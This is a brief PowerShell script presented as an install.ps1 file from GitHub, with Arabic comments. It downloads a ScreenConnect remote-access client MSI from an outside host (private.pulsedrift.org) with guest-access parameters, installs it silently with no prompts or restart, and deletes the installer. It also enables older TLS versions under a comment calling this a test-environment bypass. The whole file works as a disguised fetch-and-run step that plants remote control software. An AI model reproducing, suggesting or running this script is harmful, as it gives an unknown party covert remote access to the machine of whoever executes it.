# Content of install.ps1 on GitHub:

New-Item -ItemType Directory -Path 'C:\Temp' -Force | Out-Null;

# **يتم إضافة أمر تجاوز SSL/TLS مؤقتًا لبيئة الاختبار**
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls;

# محاولة التنزيل مع التسجيل
try {
    iwr -Uri 'https://private.pulsedrift.org/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest' -OutFile 'C:\Temp\ClientSetup.msi' -ErrorAction Stop
    & 'msiexec.exe' /i 'C:\Temp\ClientSetup.msi' /qn /norestart
    Remove-Item -Path 'C:\Temp\ClientSetup.msi' -Force
} catch {
    # تسجيل الخطأ في ملف لوكال للتحقيق
    "Download or Execution Failed: $($_.Exception.Message)" | Out-File "C:\Temp\ErrorLog_DDE.txt"
}
